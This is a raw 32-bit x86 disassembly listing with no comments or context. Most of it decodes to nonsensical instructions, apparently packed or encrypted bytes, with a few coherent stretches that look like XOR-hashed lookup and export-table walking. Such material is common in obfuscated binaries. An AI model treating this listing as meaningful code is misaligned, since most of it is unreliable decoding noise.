  41488b:	imul   DWORD PTR [ecx-0x75c69cbf]
  414891:	imul   edi,edx,0x4ddcbf7c
  414897:	push   0xffffffa0
  414899:	loop   0x4148a4
  41489b:	cmp    al,0xb6
  41489d:	push   ebx
  41489e:	inc    edx
  41489f:	rol    DWORD PTR [esi+0x7aa77a4b],cl
  4148a5:	addr16 dec esi
  4148a7:	rol    DWORD PTR [edi-0x3b],0xc5
  4148ab:	push   0x1c
  4148ad:	dec    ebx
  4148ae:	cmp    DWORD PTR [ebp-0x41efd34a],edx
  4148b4:	popf   
  4148b5:	shr    dh,0xc6
  4148b8:	cmp    al,0x43
  4148ba:	in     al,dx
  4148bb:	mov    al,0xe1
  4148bd:	pop    ss
  4148be:	popa   
  4148bf:	ins    DWORD PTR es:[edi],dx
  4148c0:	in     al,0x78
  4148c2:	mov    ds:0x1e0c5f06,al
  4148c7:	lds    ebx,FWORD PTR [ebx-0x549da150]
  4148cd:	xor    DWORD PTR [ecx+0x5c],0x44bc4925
  4148d4:	jo     0x414928
  4148d6:	call   0xdeb6:0x2f6906d7
  4148dd:	aad    0x6c
  4148df:	mov    bl,0x63
  4148e1:	push   edx
  4148e2:	push   0xbd22a009
  4148e7:	lds    esp,FWORD PTR [edx]
  4148e9:	cmp    al,0x70
  4148eb:	ror    DWORD PTR [ebp+0x6c6b58],cl
  4148f1:	clc    
  4148f2:	dec    ebx
  4148f3:	add    ch,BYTE PTR [eax]
  4148f5:	aaa    
  4148f6:	jmp    0x4148d3
  4148f8:	inc    ecx
  4148f9:	push   eax
  4148fa:	into   
  4148fb:	xchg   edi,eax
  4148fc:	push   0xf2ea2b5
  414901:	fisttp QWORD PTR [edi+ebx*2+0x3a]
  414905:	out    0x1,eax
  414907:	sbb    eax,0x13122c7f
  41490c:	mov    edi,0xb5a8b758
  414911:	cmp    DWORD PTR [ecx-0x1e3560e1],esi
  414917:	imul   esp,DWORD PTR [ebx+0x34],0x6cc59eab
  41491e:	scas   al,BYTE PTR es:[edi]
  41491f:	push   ecx
  414920:	mov    esp,DWORD PTR [edi-0x200ba903]
  414926:	mov    ds:0xcf1c21f2,al
  41492b:	mul    DWORD PTR [ecx+0x43]
  41492e:	sbb    eax,0xebf54976
  414933:	push   ebp
  414934:	sahf   
  414935:	push   0xffffffcd
  414937:	jns    0x414978
  414939:	sbb    al,0xc8
  41493b:	sbb    BYTE PTR [ebx-0x11982527],bl
  414941:	jne    0x414969
  414943:	loope  0x4148e4
  414945:	adc    cl,BYTE PTR [eax]
  414947:	das    
  414948:	xor    BYTE PTR [edi-0x5d],dh
  41494b:	fld    QWORD PTR [ecx]
  41494d:	dec    esi
  41494e:	std    
  41494f:	popf   
  414950:	sbb    al,0x16
  414952:	(bad)  
  414953:	in     al,dx
  414954:	sub    eax,0x4dc8e2e4
  414959:	pop    ecx
  41495a:	sub    ah,BYTE PTR [esi]
  41495c:	xor    al,al
  41495e:	mov    fs,WORD PTR [eax-0x4578dd19]
  414964:	jns    0x4149b0
  414966:	aaa    
  414967:	(bad)  
  414968:	loopne 0x41493b
  41496a:	out    0xb7,al
  41496c:	xchg   ecx,eax
  41496d:	inc    eax
  41496e:	sbb    ebp,DWORD PTR [edx+0x3646d98c]
  414974:	mov    ch,0xa9
  414976:	aam    0x9b
  414978:	leave  
  414979:	pop    ebp
  41497a:	inc    eax
  41497b:	adc    ebx,esi
  41497d:	into   
  41497e:	push   ecx
  41497f:	pop    ebp
  414981:	mov    bh,0x5c
  414983:	inc    edx
  414984:	jnp    0x41499e
  414986:	retf   
  414987:	pop    ecx
  414988:	mov    esi,0xf5c00eab
  41498d:	fild   WORD PTR ds:0xabcc52b7
  414993:	fwait
  414994:	out    dx,eax
  414995:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414996:	fs imul edi,eax,0x3b
  41499a:	mov    ebp,0xce5a74f0
  41499f:	pop    ebp
  4149a0:	xchg   esi,eax
  4149a1:	xchg   edi,eax
  4149a2:	outs   dx,DWORD PTR es:[esi]
  4149a4:	ret    0x8266
  4149a7:	cwde   
  4149a8:	jbe    0x414948
  4149aa:	shr    BYTE PTR [ebx-0x163cbcbc],1
  4149b0:	pop    eax
  4149b1:	enter  0x229f,0xe3
  4149b5:	mov    ebx,0x6ae23d28
  4149ba:	data16 jecxz 0x414a1e
  4149bd:	clc    
  4149be:	sub    BYTE PTR ds:0x78775771,dh
  4149c4:	mov    ebx,0xe5bb810a
  4149c9:	pushf  
  4149ca:	mov    esi,0x6b7e5e3c
  4149cf:	aas    
  4149d0:	retf   
  4149d1:	hlt    
  4149d2:	nop
  4149d3:	loop   0x414a2f
  4149d5:	xor    al,0x52
  4149d7:	sub    ecx,DWORD PTR [ebx-0x68]
  4149da:	sar    DWORD PTR [ebp-0xb19b521],cl
  4149e0:	mov    dl,0xf3
  4149e2:	inc    eax
  4149e3:	mov    ds:0x4a5b00cd,eax
  4149e8:	mov    ebx,0xad6da810
  4149ed:	inc    eax
  4149ee:	lds    edx,FWORD PTR [edx-0xe]
  4149f1:	(bad)  
  4149f2:	in     al,0xf4
  4149f4:	jle    0x414a12
  4149f6:	ja     0x4149bb
  4149f8:	mov    dl,BYTE PTR [esp+ecx*8+0x4e92f71d]
  4149ff:	push   edx
  414a00:	adc    esp,ebp
  414a02:	jp     0x414988
  414a04:	jb     0x414a46
  414a06:	dec    ebp
  414a07:	cmp    esi,DWORD PTR [ecx-0x3b]
  414a0a:	retf   0xdb25
  414a0d:	je     0x414992
  414a0f:	aas    
  414a10:	call   DWORD PTR [ebx-0x10b35986]
  414a16:	sbb    BYTE PTR [ebp-0x7f],dl
  414a19:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a1a:	cdq    
  414a1b:	cli    
  414a1c:	xchg   ecx,eax
  414a1d:	xchg   ecx,eax
  414a1e:	or     esi,DWORD PTR [edi]
  414a20:	pop    es
  414a21:	jae    0x414a74
  414a23:	mov    ah,0x3a
  414a25:	int3   
  414a26:	adc    ebx,ecx
  414a28:	sti    
  414a29:	xchg   edi,eax
  414a2a:	cli    
  414a2b:	xor    esp,ebx
  414a2d:	jp     0x414a38
  414a2f:	inc    ecx
  414a30:	in     al,dx
  414a31:	call   FWORD PTR [edx]
  414a33:	add    DWORD PTR [ebp+0x5],ebp
  414a36:	add    dh,BYTE PTR ds:0xd8ce03e6
  414a3c:	pop    si
  414a3e:	jle    0x414a55
  414a40:	(bad)  
  414a42:	xchg   esp,eax
  414a43:	fadd   st(1),st
  414a45:	mov    edi,0x57999dc9
  414a4a:	(bad)  
  414a4b:	fimul  DWORD PTR [ecx-0x3a9fe600]
  414a51:	pop    ebp
  414a52:	pop    edi
  414a53:	pop    ecx
  414a54:	mov    bl,bh
  414a56:	call   0x9c9970e9
  414a5b:	sbb    BYTE PTR [ecx-0xb],0x9
  414a5f:	sub    al,0x8d
  414a61:	retf   
  414a62:	call   0x8ed4:0x4b5eb69c
  414a69:	rcl    DWORD PTR [eiz*4+0x55eb3972],cl
  414a70:	push   0x25
  414a72:	(bad)  
  414a73:	lock xchg ebp,edi
  414a76:	daa    
  414a77:	fst    QWORD PTR [ebx]
  414a79:	jo     0x414adf
  414a7b:	das    
  414a7c:	mov    eax,0xf1af0a49
  414a81:	pop    edx
  414a82:	adc    bh,BYTE PTR [esi-0x35]
  414a85:	mov    edi,ebx
  414a87:	lods   al,BYTE PTR ds:[esi]
  414a88:	ins    BYTE PTR es:[edi],dx
  414a89:	scas   eax,DWORD PTR es:[edi]
  414a8a:	pusha  
  414a8b:	and    DWORD PTR [edx+0x24907023],ebp
  414a91:	mov    ebx,0xd4f37449
  414a96:	xor    al,0xc1
  414a98:	push   esi
  414a99:	dec    ebx
  414a9a:	pop    eax
  414a9b:	dec    esp
  414a9c:	aam    0x4a
  414a9e:	shr    DWORD PTR [edx+0x58b54661],0x12
  414aa5:	lea    esp,[ecx+0x32a5e1bd]
  414aab:	cld    
  414aac:	shl    edi,0xe9
  414aaf:	in     al,dx
  414ab0:	inc    eax
  414ab1:	push   cs
  414ab2:	fmulp  st(5),st
  414ab4:	outs   dx,BYTE PTR ds:[esi]
  414ab5:	aas    
  414ab6:	jmp    0xbaec125f
  414abb:	ret    0x34bb
  414abe:	cmp    al,0xaf
  414ac0:	rcl    DWORD PTR [edx],1
  414ac2:	dec    eax
  414ac3:	not    DWORD PTR [edx-0x7f5b501f]
  414ac9:	or     BYTE PTR [esi],dl
  414acb:	mov    ecx,0x2e3ffa15
  414ad0:	daa    
  414ad1:	aad    0x17
  414ad3:	adc    DWORD PTR [ebx+eiz*2-0x5a],esi
  414ad7:	fcomp  QWORD PTR [esp+ecx*1-0x30]
  414adb:	lock test DWORD PTR [esi-0x7c13173a],edx
  414ae2:	push   edx
  414ae3:	and    esp,eax
  414ae5:	sti    
  414ae6:	xchg   ecx,eax
  414ae7:	retf   
  414ae8:	(bad)  
  414aea:	std    
  414aeb:	inc    edi
  414aec:	test   DWORD PTR [edi-0x380cf152],esp
  414af2:	aam    0x9e
  414af4:	jl     0x414aff
  414af6:	sbb    eax,0x36ea74cb
  414afb:	(bad)  
  414afc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414afd:	data16 cmp BYTE PTR [ebx-0x28e2344],cl
  414b04:	xor    DWORD PTR [edi],eax
  414b06:	sub    DWORD PTR [ebx+0x17],esp
  414b09:	jnp    0x414a9d
  414b0b:	mov    ds:0xb1a19865,al
  414b10:	mov    eax,ds:0xd7c6d8d4
  414b15:	and    dh,BYTE PTR [edi+0x75]
  414b18:	or     BYTE PTR [ebx-0x57],bh
  414b1b:	jnp    0x414b35
  414b1d:	mov    ecx,edi
  414b1f:	stc    
  414b20:	and    BYTE PTR [ecx+eiz*1+0x75283e34],bh
  414b27:	clc    
  414b28:	out    dx,al
  414b29:	lahf   
  414b2a:	mov    ds:0x6035cfe1,eax
  414b2f:	adc    al,0x30
  414b31:	mov    ah,0x84
  414b33:	add    eax,ebx
  414b35:	cmp    ecx,eax
  414b37:	jne    0x414b5a
  414b3d:	mov    eax,DWORD PTR [ebp-0x20]
  414b40:	inc    edi
  414b41:	cmp    edi,eax
  414b43:	jb     0x413464
  414b49:	jmp    0x414b6a
  414b4e:	mov    eax,DWORD PTR [ebp-0x4]
  414b51:	xor    eax,esi
  414b53:	add    eax,ebx
  414b55:	jmp    0x417530
  414b5a:	mov    eax,DWORD PTR [ebp-0x2c]
  414b5d:	movzx  eax,WORD PTR [eax+edi*2]
  414b61:	mov    ecx,DWORD PTR [ebp-0x14]
  414b64:	mov    eax,DWORD PTR [ecx+eax*4]
  414b67:	mov    DWORD PTR [ebp+0xc],eax
  414b6a:	mov    eax,DWORD PTR [ebp-0x4]
  414b6d:	mov    ecx,DWORD PTR [ebp-0x8]
  414b70:	xor    eax,0x7510855
  414b75:	add    eax,ebx
  414b77:	cmp    ecx,eax
  414b79:	jne    0x414b8c
  414b7f:	mov    eax,DWORD PTR [ebp-0x4]
  414b82:	xor    eax,0x7510855
  414b87:	jmp    0x414b53
  414b8c:	mov    eax,DWORD PTR [ebp+0xc]
  414b8f:	add    eax,DWORD PTR [ebp+0x8]
  414b92:	mov    DWORD PTR [ebp-0x10],eax
  414b95:	mov    eax,DWORD PTR [ebp-0x1c]
  414b98:	test   eax,eax
  414b9a:	je     0x41638a
  414ba0:	mov    DWORD PTR [ebp-0x24],esi
  414ba3:	push   0xb
  414ba5:	jmp    0x414e89
  414baa:	icebp  
  414bab:	sbb    edi,DWORD PTR [edi-0xe9daa7e]
  414bb1:	imul   edi,edx,0x25
  414bb4:	outs   dx,DWORD PTR ds:[esi]
  414bb5:	stc    
  414bb6:	add    dh,bh
  414bb8:	jbe    0x414b84
  414bba:	pop    ebx
  414bbb:	jnp    0x414c3c
  414bbd:	jo     0x414b78
  414bbf:	jle    0x414c31
  414bc1:	jo     0x414b5c
  414bc3:	popf   
  414bc4:	clc    
  414bc5:	js     0x414bdc
  414bc7:	mov    bh,0x36
  414bc9:	jno    0x414b7a
  414bcb:	fstp   QWORD PTR [esp+esi*4-0x32]
  414bcf:	push   ss
  414bd0:	ficomp WORD PTR [ebx+edx*4]
  414bd3:	daa    
  414bd4:	mov    ?,WORD PTR [ebx]
  414bd6:	int    0x56
  414bd8:	ret    0x1c69
  414bdb:	mov    BYTE PTR ds:0x79e85c11,ch
  414be1:	mov    ebx,0xd76b8d32
  414be6:	rcr    bh,1
  414be8:	and    BYTE PTR [ecx],0x48
  414beb:	pop    es
  414bec:	sub    BYTE PTR [eax-0x31e9aaba],ah
  414bf2:	(bad)  
  414bf3:	xor    ch,BYTE PTR [edi]
  414bf5:	ret    0x9dea
  414bf8:	dec    edi
  414bf9:	adc    eax,0x4253c25c
  414bfe:	and    eax,0x366cb885
  414c03:	mov    al,ds:0xb6d4fb0d
  414c08:	ret    0xd53
  414c0b:	inc    ecx
  414c0c:	cld    
  414c0d:	arpl   si,bp
  414c0f:	dec    edx
  414c10:	(bad)  
  414c11:	fsub   DWORD PTR [edx+eax*2-0x29a7386d]
  414c18:	or     al,0x34
  414c1a:	jae    0x414c74
  414c1c:	pop    ebx
  414c1d:	xchg   ebx,eax
  414c1e:	adc    DWORD PTR [ecx+0x2f15c85b],edi
  414c24:	shr    BYTE PTR [ebx+ebp*8-0x39cbff9f],0xfe
  414c2c:	inc    edi
  414c2d:	ins    DWORD PTR es:[edi],dx
  414c2e:	pop    es
  414c2f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414c30:	hlt    
  414c31:	std    
  414c32:	gs jno 0x414bc4
  414c35:	mov    eax,ds:0xe270c514
  414c3a:	shr    DWORD PTR [ebx],cl
  414c3c:	cs push edx
  414c3e:	cmp    edi,ecx
  414c40:	fiadd  WORD PTR [edi]
  414c42:	xchg   DWORD PTR [edx-0x7809c7fd],ebp
  414c48:	rcl    BYTE PTR [eax+0x217b61c0],0x3
  414c4f:	bndldx (bad),[esi+0x7354b970]
  414c56:	data16 fs xor al,0xc4
  414c5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c5b:	dec    edx
  414c5c:	bound  ecx,QWORD PTR [esi-0x19]
  414c5f:	mov    DWORD PTR [esi],ecx
  414c61:	rol    esi,1
  414c63:	jg     0x414c5d
  414c65:	iret   
  414c66:	lahf   
  414c67:	push   ecx
  414c68:	add    ebp,edi
  414c6a:	out    0xf2,al
  414c6c:	mov    edx,0x519644e4
  414c71:	xchg   esp,eax
  414c72:	lahf   
  414c73:	aaa    
  414c74:	xbegin 0x2f85a8fd
  414c7a:	mov    DWORD PTR [ebp+0x52],esp
  414c7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414c7e:	adc    esi,ecx
  414c80:	das    
  414c81:	push   edi
  414c82:	iret   
  414c83:	fisttp WORD PTR [ecx]
  414c85:	stc    
  414c86:	push   edx
  414c87:	adc    DWORD PTR [esi-0x4d],ebx
  414c8a:	out    dx,eax
  414c8b:	cmp    ah,ch
  414c8d:	dec    ebx
  414c8e:	addr16 in al,dx
  414c90:	enter  0x5593,0xd5
  414c94:	nop
  414c95:	loop   0x414ca5
  414c97:	lods   eax,DWORD PTR ds:[esi]
  414c98:	inc    edi
  414c99:	add    bl,BYTE PTR [esp+eax*8-0x16]
  414c9d:	mov    bl,0x3
  414c9f:	fidiv  DWORD PTR [esi+0x63103eb0]
  414ca5:	mov    al,0x85
  414ca7:	(bad)  
  414ca8:	clc    
  414ca9:	adc    al,0xaa
  414cab:	xchg   ebx,eax
  414cac:	call   0x951457b8
  414cb1:	cmp    esi,DWORD PTR [edx-0x78a908c7]
  414cb7:	call   0xced2c2db
  414cbc:	dec    edi
  414cbd:	sub    dl,BYTE PTR [edi-0x1a840d3b]
  414cc3:	cmc    
  414cc4:	out    0x1e,al
  414cc6:	fbstp  TBYTE PTR [eax]
  414cc8:	nop
  414cc9:	xchg   esi,eax
  414cca:	mov    edi,0x6a175a1f
  414ccf:	test   BYTE PTR [eax-0x3c],ah
  414cd2:	push   esi
  414cd3:	mov    ebx,0xaf5c4f00
  414cd8:	sbb    ah,BYTE PTR [ebx-0x77]
  414cdb:	jae    0x414c83
  414cdd:	outs   dx,DWORD PTR ds:[esi]
  414cde:	and    esi,eax
  414ce0:	lods   eax,DWORD PTR ds:[esi]
  414ce1:	mov    dl,0x54
  414ce3:	scas   eax,DWORD PTR es:[edi]
  414ce4:	jnp    0x414d3f
  414ce6:	jo     0x414caa
  414ce8:	push   eax
  414ce9:	stos   DWORD PTR es:[edi],eax
  414cea:	mov    edx,DWORD PTR [ebx]
  414cec:	mov    ecx,0x3c1f89bf
  414cf1:	cmp    BYTE PTR [eax+0x7],0x1e
  414cf5:	loope  0x414d17
  414cf7:	cld    
  414cf8:	outs   dx,DWORD PTR ds:[esi]
  414cf9:	push   ss
  414cfa:	jmp    0x263e43ef
  414cff:	cmp    edx,DWORD PTR [ecx+0x64]
  414d02:	mov    esp,0x2742268f
  414d07:	sbb    al,0xc5
  414d09:	inc    esp
  414d0a:	sbb    eax,0x6918d156
  414d0f:	mov    ds:0x6f924165,al
  414d14:	dec    esp
  414d15:	dec    edi
  414d16:	push   0x23b87b62
  414d1b:	mov    ecx,0x22b4ffb9
  414d20:	gs inc ebp
  414d22:	mov    al,ds:0x920dea3e
  414d27:	retf   
  414d28:	inc    ax
  414d2a:	push   ebx
  414d2b:	cs xor esi,edi
  414d2e:	retf   0x18f
  414d31:	out    dx,eax
  414d32:	mov    ?,WORD PTR [edx+0x6343ca5f]
  414d38:	xor    ecx,DWORD PTR [eax-0x2a]
  414d3b:	sbb    BYTE PTR [eax-0x63f65acf],bl
  414d41:	fbstp  TBYTE PTR [ecx-0x22]
  414d44:	sbb    cl,BYTE PTR [ebp-0x22]
  414d47:	pop    edi
  414d48:	xor    eax,0xce0cb77d
  414d4d:	inc    edi
  414d4e:	rcr    DWORD PTR [edx-0x71],0xd6
  414d52:	push   0x5b
  414d54:	inc    edx
  414d55:	mov    ds:0xceda1679,eax
  414d5a:	push   0x13067957
  414d5f:	mov    edi,0x5ae8db1c
  414d64:	mov    edi,0xebde9021
  414d69:	in     eax,0x59
  414d6b:	ins    DWORD PTR es:[edi],dx
  414d6c:	add    DWORD PTR [ecx-0x6a],edx
  414d6f:	push   edi
  414d70:	pop    ss
  414d71:	cmp    eax,0xf1994cd8
  414d76:	popf   
  414d77:	(bad)  
  414d78:	mov    ebp,0x90aca2cb
  414d7d:	cdq    
  414d7e:	jns    0x414de4
  414d80:	(bad)  
  414d81:	jmp    0xc39c2e6c
  414d86:	cwde   
  414d87:	(bad)  
  414d88:	and    BYTE PTR [edi-0x4d],bl
  414d8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d8c:	sti    
  414d8d:	mov    DWORD PTR [esi+0x5a71aebe],eax
  414d93:	add    bh,BYTE PTR [ebp-0x79]
  414d96:	push   ds
  414d97:	loop   0x414d7e
  414d99:	std    
  414d9a:	das    
  414d9b:	or     dh,dh
  414d9d:	mov    edi,esp
  414d9f:	xchg   ebp,eax
  414da0:	jnp    0x414ded
  414da2:	xchg   esp,eax
  414da3:	scas   al,BYTE PTR es:[edi]
  414da4:	je     0x414d42
  414da6:	sub    BYTE PTR [ecx-0x146e16b9],ch
  414dac:	sub    al,0xc5
  414dae:	sbb    al,0x7a
  414db0:	jmp    0xaf64:0xdb965685
  414db7:	or     al,0x7e
  414db9:	add    eax,0xb6fc5b95
  414dbe:	int3   
  414dbf:	inc    ecx
  414dc0:	push   esp
  414dc1:	or     eax,0x8ef77e19
  414dc6:	xor    al,ch
  414dc8:	jle    0x414db4
  414dca:	pop    ds
  414dcb:	mov    ch,0x25
  414dcd:	scas   al,BYTE PTR es:[edi]
  414dce:	jbe    0x414e44
  414dd0:	mov    edi,0xddf871b6
  414dd5:	rcr    DWORD PTR [ebx-0x6036cabd],1
  414ddb:	jne    0x414d6b
  414ddd:	inc    eax
  414dde:	pop    ss
  414ddf:	mov    ?,WORD PTR [eax+edx*4-0x50ce8909]
  414de6:	out    dx,eax
  414de7:	rol    BYTE PTR [ecx],0x4
  414dea:	mov    eax,ds:0x1362c74f
  414def:	or     BYTE PTR [ebp+0x4b],ch
  414df2:	ret    0x7df2
  414df5:	xchg   ebx,eax
  414df6:	dec    edi
  414df7:	inc    eax
  414df8:	inc    edx
  414df9:	ja     0x414e3a
  414dfb:	push   ss
  414dfc:	ja     0x414e3d
  414dfe:	push   cs
  414dff:	mov    BYTE PTR [edx+0x308b894f],dl
  414e05:	push   edi
  414e06:	xchg   ebx,eax
  414e07:	fisubr DWORD PTR [ecx-0x276a9e07]
  414e0d:	and    al,0x18
  414e0f:	adc    ecx,ebx
  414e11:	jmp    0x414e63
  414e13:	add    eax,0xf379b5f
  414e18:	pop    esi
  414e19:	or     eax,0x4a5946e4
  414e1e:	mov    edx,0x57b4fc57
  414e23:	dec    edi
  414e24:	outs   dx,BYTE PTR ds:[esi]
  414e25:	scas   al,BYTE PTR es:[edi]
  414e26:	add    DWORD PTR [esi-0x148f4d0d],ebx
  414e2c:	sub    al,0xbb
  414e2e:	test   cl,ah
  414e30:	and    ch,BYTE PTR [ebx-0x4123feaa]
  414e36:	jge    0x414de3
  414e38:	shl    DWORD PTR [ebx-0x58],cl
  414e3b:	into   
  414e3c:	ret    
  414e3d:	inc    esi
  414e3e:	(bad)  [edi+0x70127959]
  414e44:	pop    edx
  414e45:	addr16 push ebp
  414e47:	and    ch,BYTE PTR [esi-0x138851cf]
  414e4d:	jbe    0x414e20
  414e4f:	xchg   ecx,eax
  414e50:	fwait
  414e51:	mov    cl,BYTE PTR [edi]
  414e53:	cmp    esp,esp
  414e55:	cmp    esp,DWORD PTR [eax-0x1d4dafca]
  414e5b:	sub    dl,BYTE PTR ds:0x6d75643c
  414e61:	xor    eax,0x57e851e2
  414e66:	dec    ebp
  414e67:	add    DWORD PTR [edx],0x3b
  414e6a:	imul   DWORD PTR [ebp+eax*2-0x5f182f2d]
  414e71:	in     al,dx
  414e72:	jne    0x414e8e
  414e74:	mov    esp,0xf534094c
  414e79:	sbb    BYTE PTR [ecx+0x3c],dh
  414e7c:	out    dx,eax
  414e7d:	xor    BYTE PTR [edx-0x8],ch
  414e80:	xchg   BYTE PTR [edx+0x61],dh
  414e83:	nop
  414e84:	scas   al,BYTE PTR es:[edi]
  414e85:	mov    cl,0x2d
  414e87:	fild   QWORD PTR [edi+0x59]
  414e8a:	push   0x5
  414e8c:	dec    ecx
  414e8d:	pop    ebx
  414e8e:	xchg   ebx,ecx
  414e90:	sub    ebx,ecx
  414e92:	xchg   ebx,ecx
  414e94:	dec    ecx
  414e95:	mov    eax,DWORD PTR [ebp-0x1c]
  414e98:	imul   eax,ecx
  414e9b:	jmp    0x41517f
  414ea0:	aas    
  414ea1:	fidivr DWORD PTR [ebp-0x79]
  414ea4:	sbb    DWORD PTR [ebx+0x45],esp
  414ea7:	bound  eax,QWORD PTR [ebp+0x1d]
  414eaa:	sub    al,0x44
  414eac:	xchg   ebx,edx
  414eae:	pop    edi
  414eaf:	xchg   BYTE PTR [eax+edi*2+0x7eb9707f],ah
  414eb6:	jo     0x414f28
  414eb8:	daa    
  414eb9:	or     al,cl
  414ebb:	mov    dl,BYTE PTR [edx]
  414ebd:	adc    BYTE PTR [eax+edi*4-0x12ed7aa8],0x79
  414ec5:	xchg   ebx,eax
  414ec6:	push   ss
  414ec7:	gs pusha 
  414ec9:	mov    dh,ah
  414ecb:	fnsave [ebx+0x7c]
  414ece:	jno    0x414e7a
  414ed0:	inc    edi
  414ed1:	and    eax,0x17e135b9
  414ed6:	xor    DWORD PTR [ebp+ecx*1+0x32fde741],esp
  414edd:	clc    
  414ede:	outs   dx,BYTE PTR ds:[esi]
  414edf:	dec    edx
  414ee0:	mov    al,0xdc
  414ee2:	rcl    BYTE PTR ds:0xe753a4ed,1
  414ee8:	pop    esi
  414ee9:	sub    bl,0x43
  414eec:	mov    ecx,0x2bf65ec2
  414ef1:	fwait
  414ef2:	jp     0x414ed9
  414ef4:	fs stos BYTE PTR es:[edi],al
  414ef6:	in     eax,dx
  414ef7:	push   0x4e
  414ef9:	mov    dl,0x53
  414efb:	pop    esp
  414efc:	dec    esp
  414efd:	push   0x3e
  414eff:	or     al,0xfc
  414f01:	loopne 0x414ea4
  414f03:	pushf  
  414f04:	sub    ebx,DWORD PTR [eax-0x33]
  414f07:	inc    ebx
  414f08:	add    BYTE PTR [ebx+0x6f],dl
  414f0b:	fsubr  QWORD PTR [esi+0x1e]
  414f0e:	gs dec eax
  414f10:	mov    edi,fs
  414f12:	imul   edi,ebp,0x1edf97a8
  414f18:	int    0xa2
  414f1a:	or     al,0x4c
  414f1c:	pusha  
  414f1d:	jmp    0xe3e8:0x3129e13
  414f24:	adc    eax,0xe26b1248
  414f29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414f2a:	test   al,0x6
  414f2c:	jo     0x414f15
  414f2e:	arpl   bx,bx
  414f30:	popa   
  414f31:	addr16 out 0xbb,al
  414f34:	mov    ch,0x47
  414f36:	jle    0x414f9a
  414f38:	xor    BYTE PTR [edi+0x3fee2cdf],bl
  414f3e:	push   0xffffff9c
  414f40:	jns    0x414f36
  414f42:	pop    ss
  414f43:	pusha  
  414f44:	adc    eax,0xf00bf672
  414f49:	push   0xffffff80
  414f4b:	mov    eax,0xdbd9fac5
  414f50:	push   ebp
  414f51:	fwait
  414f52:	enter  0x32d9,0xa4
  414f56:	xor    edx,eax
  414f58:	ins    DWORD PTR es:[edi],dx
  414f59:	outs   dx,DWORD PTR ds:[esi]
  414f5a:	mov    es,WORD PTR [eax-0x5b]
  414f5d:	add    dl,dh
  414f5f:	pop    es
  414f60:	adc    BYTE PTR [ebx],ah
  414f62:	cmc    
  414f63:	jg     0x414f84
  414f65:	mov    eax,0x3286e9af
  414f6a:	and    edi,DWORD PTR [edi+ecx*8-0x2f]
  414f6e:	or     esi,DWORD PTR [eax+0x4c]
  414f71:	popf   
  414f72:	dec    ebp
  414f73:	shl    DWORD PTR [ebx+0x42],cl
  414f76:	test   BYTE PTR [ebx+ebx*4+0x23],0x68
  414f7b:	fwait
  414f7c:	jno    0x414fe4
  414f7e:	fdivr  QWORD PTR [edi]
  414f80:	push   es
  414f81:	hlt    
  414f82:	loopne 0x414f7b
  414f84:	scas   eax,DWORD PTR es:[edi]
  414f85:	stos   BYTE PTR es:[edi],al
  414f86:	cmp    al,0x19
  414f88:	push   esp
  414f89:	call   0x3f25:0xf135e6ad
  414f90:	fs addr16 aad 0xdc
  414f94:	add    DWORD PTR [esi-0x1b],ebp
  414f97:	jecxz  0x414f8e
  414f99:	sub    edi,eax
  414f9b:	push   ebx
  414f9c:	leave  
  414f9d:	sub    eax,DWORD PTR [edx-0x54]
  414fa0:	test   BYTE PTR [ebx-0x3ba0219b],dh
  414fa6:	ins    DWORD PTR es:[edi],dx
  414fa7:	retf   0xe125
  414faa:	ins    BYTE PTR es:[edi],dx
  414fab:	pop    edi
  414fac:	add    eax,0xa848b839
  414fb1:	ficomp DWORD PTR [ebx+0x1f5bff1f]
  414fb7:	sbb    ah,BYTE PTR [edi-0x65]
  414fba:	iret   
  414fbb:	xor    BYTE PTR [bp+0x3246],dl
  414fc0:	sti    
  414fc1:	mov    eax,ds:0x24cf6cdc
  414fc6:	fistp  DWORD PTR [esp+edx*8]
  414fc9:	dec    esi
  414fca:	adc    BYTE PTR [ecx+0x11dbdd95],0x8c
  414fd1:	fwait
  414fd2:	inc    eax
  414fd3:	or     BYTE PTR [esi+0x50],0x13
  414fd7:	and    bl,BYTE PTR [ecx+0x59]
  414fda:	cmc    
  414fdb:	cmp    cl,BYTE PTR [ebx+0x78098267]
  414fe1:	and    ecx,ebx
  414fe3:	sti    
  414fe4:	fwait
  414fe5:	mov    ecx,0x59684e28
  414fea:	sub    al,0x1f
  414fec:	adc    BYTE PTR [eax],ch
  414fee:	add    esi,DWORD PTR [ecx-0x12]
  414ff1:	add    bh,ch
  414ff3:	ins    BYTE PTR es:[edi],dx
  414ff4:	xchg   edi,eax
  414ff5:	mov    DWORD PTR [edi+edx*2-0x79],esi
  414ff9:	es add eax,0xc9c11f5a
  414fff:	xchg   esi,eax
  415000:	push   edx
  415001:	pop    edi
  415002:	cmc    
  415003:	cmp    al,0xd7
  415005:	dec    eax
  415006:	sbb    DWORD PTR fs:[esi-0x6778a482],edx
  41500d:	(bad)  
  41500e:	popa   
  41500f:	fsub   DWORD PTR [edx]
  415011:	in     al,dx
  415012:	dec    ebx
  415013:	pop    es
  415014:	sahf   
  415015:	outs   dx,BYTE PTR ds:[esi]
  415016:	mov    edx,0xaa611b6c
  41501b:	xor    al,0x1d
  41501d:	clc    
  41501e:	xor    ah,bl
  415020:	jecxz  0x415012
  415022:	hlt    
  415023:	jae    0x41509a
  415025:	cli    
  415026:	jg     0x415069
  415028:	lds    edx,FWORD PTR [esi]
  41502a:	push   ss
  41502b:	mov    ecx,0x820f1eea
  415030:	stos   DWORD PTR es:[edi],eax
  415031:	mov    eax,0x1c4639da
  415036:	push   ebx
  415037:	pop    ebx
  415038:	sbb    eax,0x41375c26
  41503d:	pop    esi
  41503e:	data16 xor al,0x3b
  415041:	ss inc ebp
  415043:	enter  0x176c,0xaf
  415047:	mov    ?,WORD PTR [ebp-0x5cfdfb2c]
  41504d:	fimul  WORD PTR [ecx+0x22]
  415050:	repz aaa 
  415052:	push   eax
  415053:	or     DWORD PTR [esi],edx
  415055:	into   
  415056:	rcr    cl,1
  415058:	loope  0x415018
  41505a:	in     eax,dx
  41505b:	sbb    DWORD PTR [edx],0x8
  41505e:	push   ebp
  41505f:	mov    dl,0xe8
  415061:	sbb    eax,DWORD PTR [edx]
